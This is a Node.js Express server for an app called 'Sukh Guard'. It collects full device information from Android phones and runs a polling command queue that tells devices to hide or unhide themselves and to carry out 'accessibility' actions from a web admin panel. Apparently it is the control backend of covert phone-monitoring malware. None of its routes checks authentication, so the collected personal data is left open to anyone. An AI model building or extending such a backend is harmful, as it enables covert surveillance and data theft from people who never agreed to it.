const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();

// Render ke liye environment port use karo, nahi toh 3000
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(bodyParser.json({ limit: '10mb' }));

// Website folder serve karega
app.use(express.static('website'));

// Data storage file
const DATA_FILE = './app_data.json';

// Commands storage file - NEW
const COMMANDS_FILE = './commands_data.json';

// Initialize data file if not exists
const initializeDataFile = () => {
    if (!fs.existsSync(DATA_FILE)) {
        const initialData = {
            users: [],
            app_data: [],
            stats: {
                total_users: 0,
                total_data: 0
            }
        };
        fs.writeFileSync(DATA_FILE, JSON.stringify(initialData, null, 2));
        console.log('✅ Data file created successfully');
    }
};

// Initialize commands file if not exists - NEW
const initializeCommandsFile = () => {
    if (!fs.existsSync(COMMANDS_FILE)) {
        const initialCommands = {
            hide_commands: [],
            accessibility_commands: [],
            stats: {
                total_hide_commands: 0,
                total_accessibility_commands: 0
            }
        };
        fs.writeFileSync(COMMANDS_FILE, JSON.stringify(initialCommands, null, 2));
        console.log('✅ Commands file created successfully');
    }
};

// Read data from file
const readData = () => {
    try {
        const data = fs.readFileSync(DATA_FILE, 'utf8');
        return JSON.parse(data);
    } catch (error) {
        console.error('Error reading data file:', error);
        return { users: [], app_data: [], stats: { total_users: 0, total_data: 0 } };
    }
};

// Write data to file
const writeData = (data) => {
    try {
        fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
        return true;
    } catch (error) {
        console.error('Error writing data file:', error);
        return false;
    }
};

// Read commands from file - NEW
const readCommands = () => {
    try {
        const commands = fs.readFileSync(COMMANDS_FILE, 'utf8');
        return JSON.parse(commands);
    } catch (error) {
        console.error('Error reading commands file:', error);
        return { hide_commands: [], accessibility_commands: [], stats: { total_hide_commands: 0, total_accessibility_commands: 0 } };
    }
};

// Write commands to file - NEW
const writeCommands = (commands) => {
    try {
        fs.writeFileSync(COMMANDS_FILE, JSON.stringify(commands, null, 2));
        return true;
    } catch (error) {
        console.error('Error writing commands file:', error);
        return false;
    }
};

// Initialize data files on server start
initializeDataFile();
initializeCommandsFile();

// 📱 MOBILE APP ROUTES

// Health check route - Render ke liye important
app.get('/health', (req, res) => {
    res.json({ 
        status: 'OK', 
        message: 'Sukh Guard Backend is running',
        timestamp: new Date().toISOString(),
        environment: process.env.NODE_ENV || 'development'
    });
});

// New user register (App se)
app.post('/api/register', (req, res) => {
    const { name, email, phone } = req.body;
    
    const data = readData();
    const newUser = {
        id: Date.now(), // Unique ID
        name,
        email,
        phone,
        created_at: new Date().toISOString()
    };
    
    data.users.push(newUser);
    data.stats.total_users = data.users.length;
    
    if (writeData(data)) {
        res.json({
            message: 'User registered successfully!',
            user_id: newUser.id
        });
    } else {
        res.status(500).json({ error: 'Failed to save user' });
    }
});

// App se data save karega - MAIN ENDPOINT
app.post('/api/website/app-data', (req, res) => {
    try {
        const { user_id, data, type } = req.body;
        
        console.log('📱 Received app data:', { user_id, type });
        
        const allData = readData();
        const newData = {
            id: Date.now(),
            user_id: user_id || 1, // Default user ID
            data: data,
            type: type || 'full_device_info',
            created_at: new Date().toISOString()
        };
        
        allData.app_data.push(newData);
        allData.stats.total_data = allData.app_data.length;
        
        if (writeData(allData)) {
            console.log('✅ Data saved successfully');
            res.json({
                success: true,
                message: 'Data saved successfully!',
                data_id: newData.id
            });
        } else {
            console.error('❌ Failed to save data');
            res.status(500).json({ 
                success: false,
                error: 'Failed to save data' 
            });
        }
    } catch (error) {
        console.error('💥 Error in app-data endpoint:', error);
        res.status(500).json({ 
            success: false,
            error: 'Internal server error' 
        });
    }
});

// App ke liye user data
app.get('/api/user/:id', (req, res) => {
    const userId = parseInt(req.params.id);
    const data = readData();
    
    const user = data.users.find(u => u.id === userId);
    if (user) {
        res.json(user);
    } else {
        res.status(404).json({ error: 'User not found' });
    }
});

// 🎯 NEW: HIDE/UNHIDE DEVICE ENDPOINT
app.post('/api/hide-device', (req, res) => {
    try {
        const { device_id, action } = req.body;
        
        console.log(`🎯 Hide request: ${action} for device: ${device_id}`);
        
        if (!device_id || !action) {
            return res.status(400).json({
                success: false,
                message: 'Device ID and action required'
            });
        }
        
        // Commands file mein save karo
        const commands = readCommands();
        const newCommand = {
            id: Date.now(),
            device_id: device_id,
            action: action, // 'hide' or 'unhide'
            type: 'hide_command',
            status: 'pending',
            created_at: new Date().toISOString(),
            executed_at: null
        };
        
        commands.hide_commands.push(newCommand);
        commands.stats.total_hide_commands = commands.hide_commands.length;
        
        if (writeCommands(commands)) {
            console.log(`✅ Hide command saved: ${action} for ${device_id}`);
            res.json({
                success: true,
                message: `${action} command received for ${device_id}`,
                command_id: newCommand.id,
                device_id: device_id,
                action: action,
                timestamp: new Date().toISOString()
            });
        } else {
            res.status(500).json({
                success: false,
                message: 'Failed to save command'
            });
        }
        
    } catch (error) {
        console.error('❌ Hide device error:', error);
        res.status(500).json({
            success: false,
            message: 'Server error'
        });
    }
});

// 🎯 NEW: ACCESSIBILITY COMMAND ENDPOINT
app.post('/api/accessibility-command', (req, res) => {
    try {
        const { device_id, action, source } = req.body;
        
        console.log(`♿ Accessibility command: ${action} for device: ${device_id}`);
        
        if (!device_id || !action) {
            return res.status(400).json({
                success: false,
                message: 'Device ID and action required'
            });
        }
        
        // Commands file mein save karo
        const commands = readCommands();
        const newCommand = {
            id: Date.now(),
            device_id: device_id,
            action: action, // 'hide' or 'unhide'
            type: 'accessibility_command',
            source: source || 'web_panel',
            status: 'pending',
            created_at: new Date().toISOString(),
            executed_at: null
        };
        
        commands.accessibility_commands.push(newCommand);
        commands.stats.total_accessibility_commands = commands.accessibility_commands.length;
        
        if (writeCommands(commands)) {
            console.log(`✅ Accessibility command saved: ${action} for ${device_id}`);
            res.json({
                success: true,
                message: `Accessibility ${action} command received`,
                command_id: newCommand.id,
                device_id: device_id,
                action: action,
                type: 'accessibility',
                timestamp: new Date().toISOString()
            });
        } else {
            res.status(500).json({
                success: false,
                message: 'Failed to save accessibility command'
            });
        }
        
    } catch (error) {
        console.error('❌ Accessibility command error:', error);
        res.status(500).json({
            success: false,
            message: 'Server error'
        });
    }
});

// 🎯 NEW: CHECK FOR PENDING COMMANDS (Android app ke liye)
app.post('/api/check-commands', (req, res) => {
    try {
        const { device_id, user_id } = req.body;
        
        console.log(`🔍 Checking commands for device: ${device_id}`);
        
        const commands = readCommands();
        
        // Device ke liye pending commands dhundho
        const pendingHideCommands = commands.hide_commands.filter(cmd => 
            cmd.device_id === device_id && cmd.status === 'pending'
        );
        
        const pendingAccessibilityCommands = commands.accessibility_commands.filter(cmd => 
            cmd.device_id === device_id && cmd.status === 'pending'
        );
        
        const allPendingCommands = [...pendingHideCommands, ...pendingAccessibilityCommands];
        
        if (allPendingCommands.length > 0) {
            // Pehla pending command return karo
            const nextCommand = allPendingCommands[0];
            
            // Command ko executed mark karo
            nextCommand.status = 'executed';
            nextCommand.executed_at = new Date().toISOString();
            writeCommands(commands);
            
            console.log(`🎯 Sending command to device: ${nextCommand.action}`);
            
            res.json({
                has_command: true,
                action: nextCommand.action,
                type: nextCommand.type,
                device_id: device_id,
                command_id: nextCommand.id,
                timestamp: new Date().toISOString()
            });
        } else {
            res.json({
                has_command: false,
                action: 'none',
                device_id: device_id,
                message: 'No pending commands',
                timestamp: new Date().toISOString()
            });
        }
        
    } catch (error) {
        console.error('❌ Check commands error:', error);
        res.status(500).json({
            success: false,
            message: 'Server error'
        });
    }
});

// 🌐 WEBSITE ROUTES

// Website ke liye all users
app.get('/api/website/users', (req, res) => {
    const data = readData();
    res.json({
        users: data.users.sort((a, b) => new Date(b.created_at) - new Date(a.created_at)),
        total: data.users.length
    });
});

// Website ke liye all app data - GET endpoint
app.get('/api/website/app-data', (req, res) => {
    try {
        const data = readData();
        
        const appDataWithUsers = data.app_data.map(item => {
            const user = data.users.find(u => u.id === item.user_id);
            return {
                ...item,
                user_name: user ? user.name : 'Unknown'
            };
        }).sort((a, b) => new Date(b.created_at) - new Date(a.created_at));
        
        console.log('📊 Sending app data to website:', appDataWithUsers.length, 'items');
        
        res.json({
            data: appDataWithUsers,
            total: appDataWithUsers.length
        });
    } catch (error) {
        console.error('Error in GET app-data:', error);
        res.status(500).json({ error: 'Failed to fetch data' });
    }
});

// 📊 STATS ROUTES
app.get('/api/stats', (req, res) => {
    const data = readData();
    res.json(data.stats);
});

// 🎯 NEW: COMMANDS STATS ROUTE
app.get('/api/commands-stats', (req, res) => {
    const commands = readCommands();
    res.json(commands.stats);
});

// 🎯 NEW: GET ALL COMMANDS (Admin ke liye)
app.get('/api/all-commands', (req, res) => {
    const commands = readCommands();
    
    const allCommands = [
        ...commands.hide_commands.map(cmd => ({ ...cmd, command_type: 'hide' })),
        ...commands.accessibility_commands.map(cmd => ({ ...cmd, command_type: 'accessibility' }))
    ].sort((a, b) => new Date(b.created_at) - new Date(a.created_at));
    
    res.json({
        commands: allCommands,
        total: allCommands.length,
        stats: commands.stats
    });
});

// 🎯 WEBSITE PAGES

// Main website dashboard
app.get('/web', (req, res) => {
    res.sendFile(path.join(__dirname, 'website', 'index.html'));
});

// Alternative dashboard route
app.get('/dashboard', (req, res) => {
    res.sendFile(path.join(__dirname, 'website', 'index.html'));
});

// Admin panel
app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'website', 'index.html'));
});

// 📄 API DOCUMENTATION
app.get('/api/docs', (req, res) => {
    res.json({
        message: 'Sukh Guard API Documentation',
        version: '2.0', // Version update kiya
        environment: process.env.NODE_ENV || 'development',
        endpoints: {
            mobile: {
                'POST /api/register': 'Register new user',
                'POST /api/website/app-data': 'Save app data',
                'GET /api/user/:id': 'Get user data',
                'POST /api/check-commands': 'Check for pending commands', // NEW
                'POST /api/hide-device': 'Hide/unhide device', // NEW
                'POST /api/accessibility-command': 'Accessibility command' // NEW
            },
            website: {
                'GET /api/website/users': 'Get all users',
                'GET /api/website/app-data': 'Get all app data',
                'GET /api/stats': 'Get statistics',
                'GET /api/commands-stats': 'Get commands statistics', // NEW
                'GET /api/all-commands': 'Get all commands' // NEW
            },
            pages: {
                'GET /web': 'Website Dashboard',
                'GET /dashboard': 'Dashboard',
                'GET /admin': 'Admin Panel'
            },
            health: {
                'GET /health': 'Server health check'
            }
        }
    });
});

// Root route - Server status
app.get('/', (req, res) => {
    res.json({
        message: '🚀 Sukh Guard Backend Server Running!',
        version: '2.0', // Version update kiya
        environment: process.env.NODE_ENV || 'development',
        port: PORT,
        storage: 'JSON File',
        features: {
            hide_commands: '✅ Available',
            accessibility_commands: '✅ Available',
            real_time_monitoring: '✅ Available'
        },
        website: {
            dashboard: 'https://' + req.get('host') + '/web',
            admin: 'https://' + req.get('host') + '/admin'
        },
        endpoints: {
            mobile: ['/api/register', '/api/website/app-data', '/api/user/:id', '/api/hide-device', '/api/accessibility-command', '/api/check-commands'],
            website: ['/api/website/users', '/api/website/app-data', '/api/commands-stats', '/api/all-commands'],
            stats: ['/api/stats'],
            pages: ['/web', '/dashboard', '/admin', '/health']
        }
    });
});

// 404 Error handler
app.use((req, res) => {
    res.status(404).json({
        error: 'Endpoint not found',
        available_endpoints: {
            api: ['/api/register', '/api/website/app-data', '/api/stats', '/api/hide-device', '/api/accessibility-command', '/api/check-commands', '/health'],
            pages: ['/web', '/dashboard', '/admin', '/api/docs']
        }
    });
});

// Server start karein - Render compatible (0.0.0.0)
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Sukh Guard Server running on port ${PORT}`);
    console.log(`🌐 Environment: ${process.env.NODE_ENV || 'development'}`);
    console.log(`📱 Mobile App API: http://localhost:${PORT}/api`);
    console.log(`🌐 Website Dashboard: http://localhost:${PORT}/web`);
    console.log(`📊 Admin Panel: http://localhost:${PORT}/admin`);
    console.log(`❤️  Health Check: http://localhost:${PORT}/health`);
    console.log(`📚 API Docs: http://localhost:${PORT}/api/docs`);
    console.log(`💾 Data Storage: ${DATA_FILE}`);
    console.log(`🎯 Commands Storage: ${COMMANDS_FILE}`);
    console.log(`\n✅ Server Version 2.0 - Hide/Unhide Features Ready!`);
});
